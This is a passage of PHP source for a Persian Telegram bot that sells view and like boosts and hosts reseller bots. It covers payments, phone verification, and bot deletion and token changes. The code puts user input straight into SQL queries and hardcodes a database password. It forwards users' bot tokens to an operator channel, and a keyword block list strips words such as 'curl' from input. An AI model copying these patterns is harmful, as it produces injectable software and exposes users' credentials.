        'text'=>"گزینه مورد نظر خود را انتخا کنید!",
        'reply_to_message_id'=>$messageid,
        'reply_markup'=>json_encode([
            'keyboard'=>[
                [['text'=>'⚖️ قوانین'],['text'=>'📋 امکانات'],['text'=>'🆘️ راهنما']],
               [['text'=>'انصراف']] 
               ],
               'resize_keyboard'=>true,
               ])
               ]);
}


elseif ($querydata == 'aha'){
    $user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$fid' LIMIT 1"));

if($user['phone'] !==null){
bot('answerCallbackQuery',[
		'callback_query_id'=>$queryid,
		'text'=>"لطفا صبر کنید!..📍",
		'show_alert'=>false
		]);
		 bot('sendmessage',[
        'chat_id'=>$fid,
        'text'=>"💰 مبلغ مورد نظر خود را بین 15000 الی 100000 ارسال کنید .

🔮 بعد از پرداخت مبلغ بصورت خودکار به اکانت شما اضاف میشود !

📋 در صورت هرگونه مشکل با پشتیبانی در ارتباط باشید .",
 'reply_to_message_id'=>$qmid,
 'allow_sending_without_reply'=>false,
 'reply_markup'=>$back,
        ]);
$connect->query("UPDATE `user` SET `step` = 'poll' WHERE `id` = '$fid' LIMIT 1");
}else{
$connect->query("UPDATE `user` SET `data` = 'taiid' WHERE `id` = '$fromid' LIMIT 1");
bot('sendmessage',[
'chat_id'=>$fid,
'text'=>"لطفا شماره همراه خود را با استفاده از دکمه '🔒 تایید و ارسال شماره' ارسال نمایید.

📌 برای جلوگیری از سواستفاده برخی افراد نیاز است شماره خود را ارسال و تایید نمایید. شماره همراه شما در جایی استفاده نخواهد شد و اینکار تنها برای احراز هویت شماست.",
'reply_to_message_id'=>$qmid,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🔒 تایید و ارسال شماره','request_contact'=>true]],
[['text'=>'انصراف']],

],
'resize_keyboard'=>true,
])
]);
}}
if ($text == '⚖️ قوانین'){
    bot('sendmessage',[
        'chat_id'=>$fromid,
        'text'=>"✓ قوانین ربات نمایندگی :

📕 تمامی ربات ها باید تابع قوانین جمهوری اسلامی ایران باشد.

📙 مسئولیت پیام های رد و بدل شده در هر ربات با صاحب آن میباشد و ما هیچگونه مسئولیتی نداریم.

📘 در صورت مشاهده استفاده از قابلیت های ربات در موارد منفی به شدت برخورد میشود.

📒 هرگونه رباتی که ساخته میشود بر روی سرور های ربات کلور میزبانی شده و هرگونه درخواست انتقال ربات به سرور های دیگر مقدور نمیباشد.

📙 هرگونه کلاهبرداری پیگری قانونی دارد.

⁉️ در صورت نیاز با پشتیبانی در ارتباط باشید :
@mashhadwebhost",
        'reply_to_message_id'=>$messageid,
        ]);
}
if ($text == '📋 امکانات'){
    bot('sendmessage',[
        'chat_id'=>$fromid,
        'text'=>"💡 • قابلیت های ربات نمایندگی :

|⭕️ بلاک و آنبلاک کاربر
|📨 ارسال پیام [ فوروارد همگانی,پیام همگانی,پیام به کاربر ]
|💰 تنظیم‌ موجودی کاربران
|📣 تنظیم کانال ها 
|🫂 تنظیمات کامل زیرمجموعه گیری [ بنر,متن,پورسانت ]
|🤖 دریافت وضعیت کامل ربات
|♒️ ست کردن متن ها []
|🔈 خاموش و روشن کردن ربات
|🧰 تنظیمات کامل وب سرویس ها [ پنل پیامکی,کلید درگاه, محصولات ]
|🧮 قابلیت تنظیم سود بر روی محصولات
|📗 راهنمای کامل ربات
|📱 پشتیبانی دقیق و کامل
|🔍 پیگیری کامل کاربران
|📊 دریافت آمار دقیق و کامل ربات
|✅ و صد ها امکانات دیگر  . . .

✅ ربات نمایندگی فوق العاده پیشرفته و بدون نقص هست !

👤سوالی داشتید پیوی : 
@mashhadwebhost",
        'reply_to_message_id'=>$messageid,
        ]);
}
if ($text == '🆘️ راهنما'){
    bot('sendmessage',[
        'chat_id'=>$fromid,
        'text'=>"✓ جهت ساخت ربات نمایندگی :

- ابتدا حساب خود را 40,000 تومان شارژ کنید.
- سپس وارد @BotFather شوید و دستور /newbot را وارد کنید.
- پس از آن نام ربات خود را ارسال کنید.
- حال آیدی( یوزرنیم ) ربات خود را ارسال کنید.

• توجه یوزرنیم شما نباید قفل باشه و حتما باید آخر آیدی bot باشه.

- تبریک !! ربات شما ساخته شد.
• حال در آخر متن همچین پیامی رو‌ مشاده میکنید :

Use this token to access the HTTP API:
50999750:AAH2_vQZ40pGd4eR4eiKH9ig2ENiQ

این پیام توکن ربات شماست ؛ با کلیک روی آن توکن ربات شما کپی میشود.

- سپس وارد بخش '⚙️ ساخت ربات' شوید و توکن ربات خود را وارد کنید. 
- ربات شما ساخته شد ، وارد ربات خود شوید ، برای ورود به پنل مدیریت ربات دکمه پنل در پایین را بزنید

‼️ توجه : توکن ربات شما شخصی است و از ارسال آن به افراد مختلف بپرهیزید.

✅ کاربر گرامی جهت شارژ حساب کاربری خود فقط از دکمه '💰 شارژ حساب' استفاده کنید.

⁉️ در صورت نیاز با پشتیبانی در ارتباط باشید :
@mashhadwebhost",
        'reply_to_message_id'=>$messageid,
        ]);
}
elseif($text == '♻️ تغییر کلید وب سرویس' and $user['step'] == 'chap'  && $tc == "private"){
bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"⚠️ آیا مطمئن هستید که میخواهید کلید وب سرویس خود‌ را تغییر دهید ؟",
'reply_to_message_id'=>$messageid,
    'reply_markup'=>$ys
            ]);
            $connect->query("UPDATE `user` SET `step` = 'chapi' WHERE `id` = '$fromid' LIMIT 1");
}	
elseif($text == '✅ بله' and $user['step'] == 'chapi'  && $tc == "private"){
bot('sendmessage',[
 'chat_id'=>$chatid,
 'text'=>"⚙ کلید وب سرویس شما با موفقیت تغییر کرد !

 کلید جدید :
`$apikeyy`",
'reply_to_message_id'=>$messageid,
'parse_mode'=>'markdown',
    'reply_markup'=>$home
]);       
 $connect->query("UPDATE user SET apikey = '$apikeyy' WHERE id = '$fromid' LIMIT 1");
$connect->query("UPDATE user SET step = 'none' WHERE id = '$fromid' LIMIT 1");
}
//============== step pay ==========
if($user['step'] == 'pay' && $tc == 'private' and $text != 'انصراف' and is_numeric($text)){
    $phone = $user["phone"];
         $code = listpays('p');
          $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
if($text >= 100000 and $text <= 5000000){


        $connect->query("INSERT INTO `pay`(`code`, `id`, `phone`, `step`, `amount`, `coin`) VALUES ($code,'$chatid',$phone,'pay','$text','$text')");
			bot('sendmessage',[
			'chat_id'=>$chatid,
			'text'=>"<code>فاکتور خرید $text  تومان برای شما صادر گردید.

فاکتور فوق برای شماره همراه  $phone صادر شده است، در صورت تایید دکمه پرداخت را لمس نمایید.
$date - $time </code>",
			'reply_to_message_id'=>$messageid,
			'parse_mode'=>'html',
			'reply_markup'=>json_encode([
	    'inline_keyboard'=>[
[['text' => 'پرداخت', 'url'=>"https://domain.ir/api/pay/nextpay.php?code=$code&get"]],
],
])
	       ]);
//    bot('sendmessage',[
//        'chat_id'=>$chatid,
//        'text'=>'⏳ در حال ساخت فاکتور پرداخت ... ',
//    ]);
//    bot('sendmessage',[
//        'chat_id'=>$chatid,
//        'text'=>"✅ فاکتور افزایش موجودی با مبلغ دلخواه با موفقیت برای شما ساخته شد
//
//لطفاً در صفحه پرداخت، شماره احراز هویت خود که با آن در ربات احراز هویت کرده‌اید را وارد نمایید. 🤖
//
//همچنین، توجه داشته باشید که از کارتی که احراز هویت را با آن انجام داده‌اید برای پرداخت استفاده شود.
//
//فاکتور فوق برای شماره همراه  {$user['phone']} صادر شده است، در صورت تایید دکمه پرداخت را لمس نمایید.
//2023/11/29 - 21:27:10
//
//بعد از پرداخت،( شماره سفارش ) که توسط درگاه به شما داده میشود را به ربات ارسال کنید تا به صورت آنی شارژ شوید.
//
//برای راهنمایی بیشتر میتوانید #راهنمای_پرداخت را در کانال اطلاع رسانی سرچ کنید .
//
//👇🏻 پرای پرداخت کافیست از دکمه زیر استفاده کنید",
//        'reply_to_message_id'=>$messageid,
//        'reply_markup'=>json_encode([
//            'inline_keyboard'=>[
//                [['text'=>"💳 پرداخت مبلغ دلخواه",'url'=>"http://cleverseen.ir.page/"]],
//            ]
//        ])
//    ]);
//    bot('sendmessage', [
//        'chat_id'=>$chatid,
//        'text'=>" کاربر گرامی لطفا `شماره سفارش` را که در انتهای پرداخت از درگاه نکست پی گرفته اید ارسال کنید . ",
//
//        'reply_markup'=>$back
//    ]);
bot('sendmessage',[
'chat_id'=>$fromid,
'text'=>"🖥 صفحه اصلی

برای ادامه کار یک بخش را انتخاب کنید",
'message_id'=>$messageid,
'reply_markup' =>$home
]);
     $connect->query("UPDATE user SET step = 'none' WHERE id = '$fromid' LIMIT 1");

}else{		 
			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>'⚠️لطفا مبلغ مورد نظر خود را بین 100000 الی 5000000 وارد نمایید
		.',
			'reply_to_message_id'=>$home,
	              ]);

}}

         elseif ($text != "انصراف")
        bot('sendmessage',[
            'chat_id'=>$chatid,
            'text'=>'❗️ خطا ، پیام شما دارای عدد ورودی نادرست است',
            'reply_to_message_id'=>$messageid,
        ]);
  }
elseif($user['step'] == 'pol' and $text != 'انصراف'){
 $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
    $phone = $user["phone"]; 
         $code = listpays('p');
         if ($text >= 15000 and $text <= 100000 and $text != 'انصراف') {
        $connect->query("INSERT INTO `pay`(`code`, `id`, `phone`, `step`, `amount`, `coin`) VALUES ($code,'$chatid',$phone,'pay','$text','$text')");
			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>"<code>فاکتور خرید $text  تومان برای شما صادر گردید.

فاکتور فوق برای شماره همراه  $phone صادر شده است، در صورت تایید دکمه پرداخت را لمس نمایید.
$date - $time </code>",
			'reply_to_message_id'=>$messageid,
			'parse_mode'=>'html',
			'reply_markup'=>json_encode([
	    'inline_keyboard'=>[
[['text' => 'پرداخت(کلیک کنید)','url' => "https://domain.ir/api/pay/nexpay.php?code=$code&get"]],
],
])
	       ]);	
bot('sendmessage',[
'chat_id'=>$fromid,
'text'=>'🖥 صفحه اصلی

برای ادامه کار یک بخش را انتخاب کنید',
'message_id'=>$messageid,
'reply_markup' =>$home
]);
     $connect->query("UPDATE user SET step = 'none' WHERE id = '$fromid' LIMIT 1");
         }else		 

			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>'⚠️ لطفا  مقدار مورد نظر خود را بین 15000 الی 100000 وارد نمایید.',
			'reply_to_message_id'=>$home,
	              ]);	

}
elseif($user['step'] == 'poll' and $text != 'انصراف'){
 $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
    $phone = $user["phone"]; 
         $code = listpays('p');
         if ($text >= 15000 and $text <= 100000 and $text != 'انصراف') {
        $connect->query("INSERT INTO `pay`(`code`, `id`, `phone`, `step`, `amount`, `coin`) VALUES ($code,'$chatid',$phone,'pay','$text','$text')");
			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>"<code>فاکتور خرید $text  تومان برای شما صادر گردید.

فاکتور فوق برای شماره همراه  $phone صادر شده است، در صورت تایید دکمه پرداخت را لمس نمایید.
$date - $time </code>",
			'reply_to_message_id'=>$messageid,
			'parse_mode'=>'html',
			'reply_markup'=>json_encode([
	    'inline_keyboard'=>[
[['text' => 'پرداخت', 'url' =>"https://domain.ir/api/pay/nexpay.php?code=$code&get"]],
],
])#j#son_encode([
   # 'inline_keyboard'=>[
#	[['text'=>"پرداخت",'url'=>"https://dmain.ir/cleverseenapi/nexpay.php?code=$code&get"]],
            #  ]
            #  ])
	       ]);	
bot('sendmessage',[
'chat_id'=>$fromid,
'text'=>'🖥 صفحه اصلی

برای ادامه کار یک بخش را انتخاب کنید',
'message_id'=>$messageid,
'reply_markup' =>$home
]);
     $connect->query("UPDATE user SET step = 'none' WHERE id = '$fromid' LIMIT 1");
         }else		 

			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>'⚠️ لطفا  مقدار مورد نظر خود را بین 15000 الی 100000 وارد نمایید.',
			'reply_to_message_id'=>$home,
	              ]);	

}
elseif ( $text == '🗑 حذف ربات'){
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `token`"));
if (isset($user['token'])){
$txt = "✅ کاربر‌ گرامی جهت حذف ربات خود لطفا توکن ربات خود را از @BotFather گرفته و به ربات ارسال کنید.";
        bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$back
]);
        SETP("delete",$fromid);
}else{
    $txt = "✅ شما در سرور کلور رباتی نساختید جهت ساخت ربات از دکمه ⚙️ ساخت ربات اقدام به ساخت ربات کنید!";
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
]);
    }}
     if ($user['step'] == 'delete' and $text != 'انصراف'){
      $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
     $url="https://api.telegram.org/bot".$text."/getme";  
      $get=json_decode(file_get_contents($url),true);
      $result =$get["result"];
 $username = $result["username"];
        $use = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `bot` = '$username' LIMIT 1"));
        if(!isset($use['bot'])){
          $txt = 'خطا ! توکن شما نامعتبر است';
          bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
]);
       
        }else{
        
         bot('sendmessage',[
	'chat_id'=>$chatid,
       "text"=>"آیا با عملیات  فوق موافقید؟⚠️",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
    'keyboard'=>[
[['text'=>'✅ تایید']],
[['text'=>'انصراف']],
              ],
              'resize_keyboard'=>true,
        ])
			]);		
			$connect->query("UPDATE `user` SET `bot` = '$username',`token` = '$text', `step` = 'end' WHERE `id` = '$fromid' LIMIT 1");
        }
    }
   if ($text == '✅ تایید' and $user['step'] == 'end'){
    $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
        $connection = new mysqli('localhost','cleverse_sheykhcp_cleverse_cr','!1a95TLbliG0!J','cleverse_sheykhcp_cleverse_webcleverse_cr');
$connection->query("SET NAMES 'utf8'"); $connection->set_charset('utf8mb4');
       $username = $user['bot'];
              $tokenbot = $user['token'];
               $connection->query("DROP TABLE `user$username`");
                              $connection->query("DROP TABLE `orderseen$username`");
               $connection->query("DROP TABLE `orderlike$username`");
               $connection->query("DROP TABLE `channel$username`");
               $connection->query("DROP TABLE `buy$username`");
               $connection->query("DROP TABLE `block$username`");
               $connection->query("DROP TABLE `setting$username`");
               $connection->query("DROP TABLE `admin$username`");
                              $connection->query("DROP TABLE `sendall$username`");
               $connection->query("DROP TABLE `daily$username`");
               $connection->query("DROP TABLE `pay$username`");
$files = glob("BotList/$username/*"); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file)) {
    unlink($file); // delete file
  }else{
	rmdir($file);
}
}
rmdir("BotList/$username");
$connect->query("DELETE FROM qw$fromid WHERE bot = '$username'");	
deletevalue("amarbot","bot",$username);

               bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"ربات شما با موفقیت حذف شد✅
",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$home
]);
bot('sendmessage',[
'chat_id'=>$channel_token_id,
'text'=>"یک ربات حذف شد✅\n\nCreator : <a href='tg://user?id=$fromid'>$firstname</a>\nCreator ID : $fromid\n\n@$username\n\nToken :$tokenbot",
 'reply_markup'=>$kein,
 'parse_mode'=>'html',
 ]);   
}
elseif($text == '🗃 تغییر توکن'){
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `token`"));
if (isset($user['token'])){
$txt = "✅ کاربر‌ گرامی جهت تغییر توکن ربات خود لطفا توکن ربات خود را از @BotFather گرفته و به ربات ارسال کنید.";
        bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$back
]);
        SETP("change",$fromid);
}else{
    $txt = "✅ شما در سرور کلور رباتی نساختید جهت ساخت ربات از دکمه ⚙️ ساخت ربات اقدام به ساخت ربات کنید!";
    bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
]);
    }}
     if ($user['step'] == 'change' and $text != 'انصراف'){
      $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
     $url="https://api.telegram.org/bot".$text."/getme";  
      $get=json_decode(file_get_contents($url),true);
      $result =$get["result"];
 $username = $result["username"];
        $use = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `bot` = '$username' LIMIT 1"));
        if(!isset($use['bot']) and $text != "انصراف"){
          $txt = 'این ربات در سرور وجود ندارد یا متعلق به شما نیست';
          bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
]);
       
        }else{
  $file=file_get_contents("seen/config.php");
$ch = str_replace("API_T",$text,$file);
$ch1 = str_replace("IDADMIN","$fromid",$ch);
 file_put_contents("BotList/$username/config.php",$ch1);
 $connect->query("UPDATE `qw$fromid` SET `bot` = '$username',`token` = '$text' WHERE bot = '$username' LIMIT 1");
  $connect->query("UPDATE `amarbot` SET `bot` = '$username',`token` = '$text' WHERE bot = '$username' LIMIT 1");
 $url2="$domain/BotList/$username/botseen6.5.php";
$url3="https://api.telegram.org/bot$text/setwebhook?url=$url2";
file_get_contents($url3);
file_get_contents("$domain/BotList/".$username."/table.php");
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"توکن ربات شما با موفقیت تغییر کرد ✅
",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$home
]);
bot('sendmessage',[
'chat_id'=>$channel_token_id,
'text'=>"تغییر توکن : n\nCreator : <a href='tg://user?id=$fromid'>$firstname</a>\nCreator ID : $fromid\n\n@$username\n\nToken :\n$text",
 'reply_markup'=>$kein,
 'parse_mode'=>'html',
 ]);   
        }
    }
    

$usr = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `token`"));

switch ($text){

case "♻️ تمدید️":
    if ($user['pol'] < 15000){
sm($fromid,"🙅🏻‍♂️ موجودی شما کافی نیست
💰موجودی شما : {$user['pol']} تومان
💵 هزینه تمدید یک ماه : 15,000 تومان",json_encode([
     'inline_keyboard'=>[
         [['text'=>'🤖 ربات نمونه','url'=>'https://t.me/mashhadwebhost'],['text'=>'➕💳','callback_data'=>"aha"]],
         ]
         ]));
}else{
    if(!isset($usr['token'])){
        sm ($fromid,'✅ شما در سرور کلور رباتی نساختید جهت ساخت ربات از دکمه ⚙️ ساخت ربات اقدام به ساخت ربات کنید!');
            $connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
    }else{
         sm($fromid,"✅ کاربر‌ گرامی جهت تمدید ربات خود لطفا توکن ربات خود را از @BotFather گرفته و به ربات ارسال کنید.",$back);
        $connect->query("UPDATE `user` SET `step` = 'tamdid' WHERE `id` = '$fromid' LIMIT 1");
    }
}
break;




}


















































































if($text == '/panel' and in_array($chatid,$admin)){
       bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"
برای ادامه کار یک بخش را انتخاب کنید:

",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>json_encode([
   'keyboard'=>[
[['text'=>"📍 آمار ربات"]],
[['text'=>"📍 اطلاعات کاربر"]],
[['text'=>"📍 افزایش موجودی"],['text'=>"📍 کسر موجودی"]],
[['text'=>"📍 ارسال به کاربران"],['text'=>"📍 فروارد به کاربران"]],
[['text'=>"📍حذف مسدود کردن"],['text'=>"📍 مسدود کردن"]],
[['text'=>"📍 ربات روشن"],['text'=>"📍 ربات خاموش"]],
[['text'=>"⚙ تنظیم اطلاعات"]],
[['text'=>"انصراف"]],
]
])
]);
}
elseif($text == 'برگشت 🔙' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage',[
   'chat_id'=>$chatid,
   'text'=>"🚦 به منوی مدیریت بازگشتید",
   'reply_markup'=>json_encode([
   'keyboard'=>[
[['text'=>"📍 آمار ربات"]],
[['text'=>"📍 اطلاعات کاربر"]],
[['text'=>"📍 افزایش موجودی"],['text'=>"📍 کسر موجودی"]],
[['text'=>"📍 ارسال به کاربران"],['text'=>"📍 فروارد به کاربران"]],
[['text'=>"📍حذف مسدود کردن"],['text'=>"📍 مسدود کردن"]],
[['text'=>"📍 ربات روشن"],['text'=>"📍 ربات خاموش"]],
[['text'=>"⚙ تنظیم اطلاعات"]],
[['text'=>"انصراف"]]
            ],
      'resize_keyboard'=>true
      ])
    ]);
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");		
}
elseif($text == '⚙ تنظیم اطلاعات' and $tc == 'private' and in_array($fromid,$admin)){
bot('sendmessage',[
   'chat_id'=>$chatid,
   'text'=>"📍 ادمین گرامی به پنل مدیریت اطلاعات وبسرویس خود خوش آمدید",
      'reply_markup'=>json_encode([
   'keyboard'=>[
     [['text'=>"📍 تنظیم قیمت ها"],['text'=>"📍 تنظیم وبسرویس ها"]],
     	 [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
          ]);
}
elseif($text == '📍 تنظیم وبسرویس ها' and $tc == 'private' and in_array($fromid,$admin)){
bot('sendmessage',[
   'chat_id'=>$chatid,
   'text'=>"🤖 جهت تنظیم وبسرویس های پشتیبان ، محصول مورد نظر را انتخاب کنید:",
   'reply_markup'=>json_encode([
         'keyboard'=>[
             [['text'=>"📍 تنظیم وبسرویس سین و لایک"]],
	         [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
              ]);
}
elseif($text == '📍 تنظیم وبسرویس سین و لایک' and $tc == 'private' and in_array($fromid,$admin)){
bot('sendmessage',[
   'chat_id'=>$chatid,
   'text'=>"🤖 جهت تنظیم آدرس ارسال درخواست و شناسه وبسرویس سین و لایک از طریق گزینه های زیر اقدام کنید",
   'reply_markup'=>json_encode([
         'keyboard'=>[
             [['text'=>"📍 لینک وبسرویس سین و لایک"]],
             [['text'=>"📍 شناسه وبسرویس سین و لایک"]],
	         [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
              ]);
}
elseif($text == '📍 شناسه وبسرویس سین و لایک' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage', [
         'chat_id' => $chatid,
         'text' => "📍 شناسه وبسرویس سین و لایک را ارسال کنید",
         'reply_to_message_id' => $messageid,
         'reply_markup' => $back_panel
     ]);
  $connect->query("UPDATE user SET step = 'setpassseen' WHERE id = '{$fromid}' LIMIT 1"); 
 }
elseif ($user['step'] == 'setpassseen') {
  if ($text != "برگشت 🔙") {
      $api["seenpass"] = "$text";
      $api["likepass"] = "$text";
  file_put_contents("erfansantricha.json",json_encode($api,true));
      bot('sendmessage', [
       'chat_id' => $chatid,
       'text' => "✅ با موفقیت تنظیم شد
   ",
       'reply_to_message_id' => $messageid,
       'reply_markup' => $back_panel
   ]);
   }
  $connect->query("UPDATE user SET step = 'none' WHERE id = '{$fromid}' LIMIT 1"); 
 }
 elseif($text == '📍 لینک وبسرویس سین و لایک' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage', [
         'chat_id' => $chatid,
         'text' => "📍 لینک وبسرویس مورد نظر را مانند نمونه زیر ارسال کنید.",
         'reply_to_message_id' => $messageid,
         'reply_markup' => $back_panel
     ]);
  $connect->query("UPDATE user SET step = 'setwebseen' WHERE id = '{$fromid}' LIMIT 1"); 
 }
elseif ($user['step'] == 'setwebseen') {
  if ($text != "برگشت 🔙") {
      $api["seenapi"] = "$text";
      $api["likeapi"] = "$text";
  file_put_contents("erfansantricha.json",json_encode($api,true));
      bot('sendmessage', [
       'chat_id' => $chatid,
       'text' => "✅ با موفقیت تنظیم شد
   ",
       'reply_to_message_id' => $messageid,
       'reply_markup' => $back_panel
   ]);
   }
  $connect->query("UPDATE user SET step = 'none' WHERE id = '{$fromid}' LIMIT 1"); 
 }
 
elseif($text == '📍 تنظیم قیمت ها' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage',[
   'chat_id'=>$chatid,
   'text'=>"🤖 جهت تنظیم قیمت ها محصول مورد نظر را انتخاب کنید",
         'reply_markup'=>json_encode([
   'keyboard'=>[
     [['text'=>"📍 بازدید"],['text'=>"📍 لایک/رای"]],
     	 [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
          ]);
}
elseif($text == '📍 بازدید' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage', [
         'chat_id' => $chatid,
         'text' => "📍 قیمت هر عدد از این محصول را ارسال کنید",
         'reply_to_message_id' => $messageid,
         'reply_markup' => $back_panel
     ]);
  $connect->query("UPDATE user SET step = 'setseen' WHERE id = '{$fromid}' LIMIT 1"); 
 }
 elseif($text == '📍 لایک/رای' and $tc == 'private' and in_array($fromid,$admin)){
    bot('sendmessage', [
         'chat_id' => $chatid,
         'text' => "📍 قیمت هر عدد از این محصول را ارسال کنید",
         'reply_to_message_id' => $messageid,
         'reply_markup' => $back_panel
     ]);
  $connect->query("UPDATE user SET step = 'setlike' WHERE id = '{$fromid}' LIMIT 1"); 
 }
elseif ($user['step'] == 'setlike') {
  if ($text != "برگشت 🔙") {
      $amounts["like"] = "$text";
  file_put_contents("amount.json",json_encode($amounts,true));
      bot('sendmessage', [
       'chat_id' => $chatid,
       'text' => "✅ با موفقیت تنظیم شد
   ",
       'reply_to_message_id' => $messageid,
       'reply_markup' => $back_panel
   ]);
   }
  $connect->query("UPDATE user SET step = 'none' WHERE id = '{$fromid}' LIMIT 1"); 
 }
elseif ($user['step'] == 'setseen') {
  if ($text != "برگشت 🔙") {
      $amounts["seen"] = "$text";
  file_put_contents("amount.json",json_encode($amounts,true));
      bot('sendmessage', [
       'chat_id' => $chatid,
       'text' => "✅ با موفقیت تنظیم شد
   ",
       'reply_to_message_id' => $messageid,
       'reply_markup' => $back_panel
   ]);
   }
  $connect->query("UPDATE user SET step = 'none' WHERE id = '{$fromid}' LIMIT 1"); 
 }
 /*
Author { @Ziazl}
*/
elseif($text == '📍 آمار ربات' and $tc == 'private' and in_array($fromid,$admin)){
$bazdid = $_seen * 1000;
$buy = file_get_contents("info/buy.json");
$buycount = $buy['count'];
$alluser = mysqli_num_rows(mysqli_query($connect,"select `id` from `user`"));
$allbot = mysqli_num_rows(mysqli_query($connect,"select `bot` from `amarbot`"));
$allorderseen = mysqli_num_rows(mysqli_query($connect,"select `id` from `orderseen`"));
$allorderlike = mysqli_num_rows(mysqli_query($connect,"select `id` from `orderlike`"));
$allorderchannel = mysqli_num_rows(mysqli_query($connect,"select `id` from `channel`"));
$allbuy = mysqli_num_rows(mysqli_query($connect,"select `id` from `buy`"));
$allblock = mysqli_num_rows(mysqli_query($connect,"select `id` from `block`"));
		bot('sendmessage',[
		'chat_id'=>$chatid,
		'text'=>"🤖 آمار ربات وبسرویس  : 

📍 تعداد کاربران : $alluser 
تعداد سفارش بازدید : $allorderseen
تعداد سفارش لایک : $allorderlike
📍 قیمت هر عدد رأی در حال حاضر : $_like 
📍 قیمت هر هزار بازدید درحال حاضر : $bazdid 
📍 تعداد خرید ها : $allbuy 
\n بخش نمایندگی\n تعداد ربات های ساخته شده : $allbot ",
		]);
		}
elseif ($text == '📍 ارسال به کاربران' and $tc == 'private' and in_array($fromid,$admin)) {
         bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>"📍 لطفا متن یا رسانه خود را ارسال کنید [میتواند شامل عکس باشد]  همچنین میتوانید رسانه را همراه با کشپن [متن چسپیده به رسانه ارسال کنید]",
	     'reply_markup'=>json_encode([
         'keyboard'=>[
	         [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
          ]);
$connect->query("UPDATE `user` SET `step` = 'sendtoall' WHERE `id` = '$fromid' LIMIT 1");
}
//======================================================
 elseif ($text == '/restart' and in_array($fromid, $admin)){
     $sod_system = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `pol` WHERE `id` = '1' LIMIT 1"));
//
//
//     $connect->query("UPDATE `pol` SET `yesterday` = '{$sod_system['today']}' , `today`='0' WHERE `id` = '1' LIMIT 1");
